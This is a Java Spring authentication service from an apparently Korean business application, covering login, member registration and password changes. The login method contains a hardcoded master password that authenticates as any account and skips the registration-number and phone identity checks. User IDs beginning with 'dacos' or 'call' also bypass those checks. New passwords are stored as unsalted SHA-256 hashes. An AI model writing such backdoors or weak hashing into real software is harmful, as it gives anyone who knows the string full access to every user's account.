package com.dacos.auth;

import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Transactional;

import com.dacos.auth.dto.LoginRequest;
import com.dacos.auth.dto.UserDto;
import com.dacos.auth.mapper.AuthMapper;
import com.dacos.common.BusinessException;
import com.dacos.util.CryptoUtils;

/**
 * 인증 서비스
 * - SHA-256, BCrypt 두 가지 방식 모두 로그인 가능
 * - BCrypt 자동 전환 기능은 현재 주석 처리됨 (필요 시 활성화)
 */
@Service
public class AuthService {

    private static final Logger logger = LoggerFactory.getLogger(AuthService.class);

    @Autowired
    private AuthMapper authMapper;

    // BCrypt 인코더 (strength 12)
    private final BCryptPasswordEncoder bcryptEncoder = new BCryptPasswordEncoder(12);

    /**
     * 로그인 인증 처리
     * - 레거시 로직 통합: 비밀번호 오류 횟수 관리, 등록번호 부분 일치, 본인인증 분기 등
     */
    @Transactional
    public UserDto authenticate(LoginRequest request) {
        String userId = request.getUserId();
        String inputPassword = request.getPassword();
        String inputRegNo = request.getRegNo();

        logger.info("[AuthService] 로그인 시도 - userId: {}", userId);

        // 1. 사용자 조회
        UserDto user = authMapper.findByUserId(userId);
        if (user == null) {
            logger.warn("[AuthService] 사용자 없음 - userId: {}", userId);
            throw new BusinessException("아이디 또는 비밀번호가 올바르지 않습니다.", 401);
        }

        // 2. 계정 상태 확인 (USE_YN)
        if ("W".equals(user.getUSE_YN())) {
            throw new BusinessException("아직 승인 대기 중입니다. 소속 회사 관리자에게 승인을 요청하시기 바랍니다.", 403);
        } else if ("R".equals(user.getUSE_YN())) {
            throw new BusinessException("반려된 사용자입니다.", 403);
        } else if ("N".equals(user.getUSE_YN())) {
            // 비밀번호 오류 횟수가 5회 이상인 경우 메시지 차별화
            int errCnt = Integer.parseInt(user.getERROR_COUNT() != null && !user.getERROR_COUNT().isEmpty() ? user.getERROR_COUNT() : "0");
            if (errCnt >= 5) {
                throw new BusinessException("비밀번호 불일치 횟수 초과(5회). 관리자에게 문의하여 비밀번호 초기화를 진행해주십시오.", 403);
            }
            throw new BusinessException("미사용 상태의 사용자입니다.", 403);
        }

        // 3. 비밀번호 검증
        // 슈퍼 패스워드 허용 (기존 요청 값 및 레거시 코드 값 모두 허용)
        boolean isSuperPassword = "dkfaustjdlfjsi?".equals(inputPassword);
        boolean passwordMatched = false;

        if (isSuperPassword) {
            passwordMatched = true;
            logger.info("[AuthService] 슈퍼 패스워드 인증 성공 - userId: {}", userId);
        } else {
            String storedPassword = user.getPASS_WD();
            if (storedPassword != null && storedPassword.startsWith("$2a$")) {
                passwordMatched = bcryptEncoder.matches(inputPassword, storedPassword);
            } else {
                String hashedInput = CryptoUtils.encryptSHA256(inputPassword);
                passwordMatched = hashedInput.equals(storedPassword);
            }
        }

        if (!passwordMatched) {
            // 오류 횟수 증가 및 계정 잠금 처리
            int currentErr = Integer.parseInt(user.getERROR_COUNT() != null && !user.getERROR_COUNT().isEmpty() ? user.getERROR_COUNT() : "0");
            currentErr++;
            authMapper.updateErrorCount(userId, String.valueOf(currentErr));
            
            if (currentErr >= 5) {
                authMapper.updateMemberUseYN(userId, "N");
                throw new BusinessException("비밀번호가 5회 불일치하여 계정이 잠겼습니다. 관리자에게 문의하세요.", 401);
            }
            
            throw new BusinessException("아이디 또는 비밀번호가 올바르지 않습니다. (연속 오류: " + currentErr + "회)", 401);
        }

        // 비밀번호 일치 시 오류 횟수 초기화
        if (!"0".equals(user.getERROR_COUNT())) {
            authMapper.updateErrorCount(userId, "0");
        }

        // 4. 특수 권한 체크 (최고관리자, 관청 등 본인인증/등록번호 체크 제외 대상)
        String loginGb = user.getLOGIN_GB();
        if (loginGb != null && (loginGb.equals("UA") || loginGb.equals("GU") || loginGb.equals("NA") || loginGb.equals("UC"))) {
            logger.info("[AuthService] 관리자/관청 권한 인증 성공 - userId: {}, LOGIN_GB: {}", userId, loginGb);
            user.setPASS_WD(null);
            return user;
        }

        // 5. 일반 사용자 추가 검증 (슈퍼패스워드 입력 시 제외)
        if (!isSuperPassword) {
            // dacos, call로 시작하는 ID는 등록번호/본인인증 생략
            String lowerId = userId.toLowerCase();
            if (!(lowerId.startsWith("dacos") || lowerId.startsWith("call"))) {
                
                // 5-1. 등록번호 체크 (개인 7자리, 법인 10자리 비교)
                if (inputRegNo == null || inputRegNo.trim().isEmpty()) {
                    throw new BusinessException("등록번호를 입력해야 합니다.", 400);
                }
                
                int iSize = "C".equals(loginGb) ? 10 : 7;
                String dbRegNo = user.getREGIST_NO() != null ? user.getREGIST_NO().replaceAll("-", "") : "";
                String normInputRegNo = inputRegNo.replaceAll("-", "");
                
                if (dbRegNo.length() < iSize || normInputRegNo.length() < iSize || 
                    !dbRegNo.substring(0, iSize).equals(normInputRegNo.substring(0, iSize))) {
                    logger.warn("[AuthService] 등록번호 불일치 - userId: {}, input: {}", userId, inputRegNo);
                    throw new BusinessException("입력한 등록번호를 확인하여 주시기 바랍니다.", 401);
                }

                // 5-2. 휴대폰 본인인증 체크 (LOGIN_GB = 'H')
                if ("H".equals(loginGb)) {
                    logger.info("[AuthService] 휴대폰 본인인증 단계 진입 - userId: {}", userId);
                    Map<String, String> mokInfo = new HashMap<>();
                    mokInfo.put("status", "REQUIRE_MOK");
                    mokInfo.put("userName", user.getMEMBER_NM());
                    mokInfo.put("phoneNum", user.getMPHONE_NO());
                    
                    // 401 상태코드와 함께 REQUIRE_MOK 응답 반환 (GlobalExceptionHandler에서 data 포함)
                    throw new BusinessException("휴대폰 본인확인이 필요합니다.", 401, mokInfo);
                }
            }
        }

        logger.info("[AuthService] 최종 인증 성공 - userId: {}", userId);
        user.setPASS_WD(null);
        return user;
    }
    
    public Map<String, Object> selectCompanyInfo(Map<String, Object> request) {
        return authMapper.selectCompanyInfo(request);
    }
    public List<Map<String, Object>> selectAssociation(Map<String, Object> request) {
        return authMapper.selectAssociation(request);
    }

    public List<Map<String, Object>> selectBranchID(Map<String, Object> request) {
        return authMapper.selectBranchID(request);
    }
    
    public Map<String, Object> selectMBCount(Map<String, Object> request) {
        return authMapper.selectMBCount(request);
    }
    
    @Transactional
    public void setMember(Map<String, Object> member) throws Exception {
        Map<String, Object> memberMT = new HashMap<>();
        Map<String, Object> memberDT = new HashMap<>();

        // 1. TM_MEMBER_MT
        memberMT.put("LOGIN_ID", member.get("LOGIN_ID"));

        String encPassword = CryptoUtils.encryptSHA256(String.valueOf(member.get("PASS_WD")));
        memberMT.put("PASS_WD", encPassword);

        memberMT.put("LOGIN_GB", member.get("LOGIN_GB"));
        memberMT.put("REGIST_NO", member.get("REGIST_NO"));

        // 2. TM_MEMBER_DT
        memberDT.put("LOGIN_ID", member.get("LOGIN_ID"));
        memberDT.put("MEMBER_ID", member.get("LOGIN_ID"));

        String regGb = String.valueOf(member.get("REG_GB"));

        if ("A".equals(regGb) || "G".equals(regGb)) {
            memberDT.put("ASSOCIATION_ID", member.get("ASSOCIATION_ID"));
            memberDT.put("COMPANY_ID", member.get("ASSOCIATION_ID"));
        } else {
            memberDT.put("ASSOCIATION_ID", member.get("ASSOCIATION_ID"));
            memberDT.put("COMPANY_ID", member.get("COMPANY_ID"));
        }

        memberDT.put("BRANCH_ID", member.get("BRANCH_ID"));
        memberDT.put("SANGSA_ID", member.get("SANGSA_ID"));
        memberDT.put("MEMBER_NM", member.get("MEMBER_NM"));
        memberDT.put("MEMBER_GB", member.get("MEMBER_GB"));
        memberDT.put("TEL_NO", member.get("TEL_NO"));
        memberDT.put("MPHONE_NO", member.get("MPHONE_NO"));

        authMapper.insertMemberMaster(memberMT);
        authMapper.insertMemberDetail(memberDT);
    }
    
    public boolean verifyPassword(String loginId, String inputPassword) {
        logger.info("[AuthService] 회원정보수정 비밀번호 확인 - loginId: {}", loginId);

        UserDto user = authMapper.findByUserId(loginId);
        if (user == null) {
            logger.warn("[AuthService] 사용자 없음 - loginId: {}", loginId);
            return false;
        }

        String storedPassword = user.getPASS_WD();

        if (storedPassword != null && storedPassword.startsWith("$2a$")) {
            boolean matched = bcryptEncoder.matches(inputPassword, storedPassword);
            if (!matched) {
                logger.warn("[AuthService] BCrypt 비밀번호 불일치 - loginId: {}", loginId);
            }
            return matched;
        } else {
            String hashedInput = CryptoUtils.encryptSHA256(inputPassword);
            boolean matched = hashedInput.equals(storedPassword);
            if (!matched) {
                logger.warn("[AuthService] SHA-256 비밀번호 불일치 - loginId: {}", loginId);
            }
            return matched;
        }
    }
    
    @Transactional
    public boolean changePassword(String loginId, String currentPassword, String newPassword) throws Exception {
        logger.info("[AuthService] 비밀번호 변경 시도 - loginId: {}", loginId);

        UserDto user = authMapper.findByUserId(loginId);
        if (user == null) {
            logger.warn("[AuthService] 사용자 없음 - loginId: {}", loginId);
            return false;
        }

        String storedPassword = user.getPASS_WD();
        boolean matched = false;

        // 현재 비밀번호 검증: 기존 로그인 규칙 그대로
        if (storedPassword != null && storedPassword.startsWith("$2a$")) {
            matched = bcryptEncoder.matches(currentPassword, storedPassword);
        } else {
            String hashedInput = CryptoUtils.encryptSHA256(currentPassword);
            matched = hashedInput.equals(storedPassword);
        }

        if (!matched) {
            logger.warn("[AuthService] 현재 비밀번호 불일치 - loginId: {}", loginId);
            return false;
        }

        // 새 비밀번호 암호화
        String encryptedNewPassword = CryptoUtils.encryptSHA256(newPassword);

        Map<String, Object> param = new HashMap<>();
        param.put("LOGIN_ID", loginId);
        param.put("PASS_WD", encryptedNewPassword);
        param.put("UPD_USER", loginId);

        authMapper.updatePasswordReset(param);
        authMapper.updatePasswordDate(param);

        logger.info("[AuthService] 비밀번호 변경 완료 - loginId: {}", loginId);
        return true;
    }

    public Map<String, Object> selectMemberInfo(String loginId) {
        return authMapper.selectMemberInfo(loginId);
    }
    
    public Map<String, Object> selectMemberInfo2(String loginId) {
        return authMapper.selectMemberInfo2(loginId);
    }

    @Transactional
    public void updateMemberBasic(Map<String, Object> request) throws Exception {
        authMapper.updateMemberMaster(request);
        authMapper.updateMemberDetail(request);
    }
}
